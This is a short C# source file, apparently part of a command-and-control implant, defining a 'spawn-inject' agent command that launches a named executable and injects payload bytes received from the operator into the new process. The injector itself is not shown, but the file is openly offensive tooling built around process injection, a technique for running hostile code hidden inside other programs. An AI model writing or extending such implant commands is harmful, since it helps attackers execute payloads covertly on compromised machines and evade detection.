using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;
using Agent.Internal;
namespace Agent.Commands
{
    public class SpawnInject : AgentCommand
    {
        public override string Name => "spawn-inject";

        public override string Execute(AgentTask task)
        {
            var exe = task.Args[0];
            var injector = new SpawnInjector();
            var success = injector.Inject(task.FileBytes,exeToRun:exe);
            if (success) return "Spawned New Process And Injected!";
            return "Failed to inject spawned process";
        }
    }
}
